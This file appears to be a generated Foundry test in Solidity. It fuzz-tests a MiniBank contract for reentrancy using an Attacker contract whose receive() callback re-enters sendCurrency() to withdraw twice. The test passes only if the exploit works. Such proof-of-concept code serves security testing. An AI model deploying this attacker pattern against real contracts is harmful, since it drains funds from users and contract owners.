// Generation Time: 1,66s
// Input Tokens: 4148
// Output Tokens: 429
// Reasoning Tokens: 


// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/MiniBank.sol";

contract TestReentrancyMiniBank is Test {
    MiniBank public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new MiniBank();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0 && attackVal < 100 ether);

        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    MiniBank public victim;
    uint256 public reentrancyCount;
    bool public exploitSucceeded;

    constructor(address victimAddress) {
        victim = MiniBank(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        reentrancyCount = 0;
        exploitSucceeded = false;
        victim.receiveCurrency{value: val}();
    }

    function attack(uint256 val) public {
        victim.sendCurrency();
        exploitSucceeded = reentrancyCount > 1;
    }

    receive() external payable {
        reentrancyCount++;
        if (reentrancyCount < 2) {
            victim.sendCurrency();
        }
    }
}
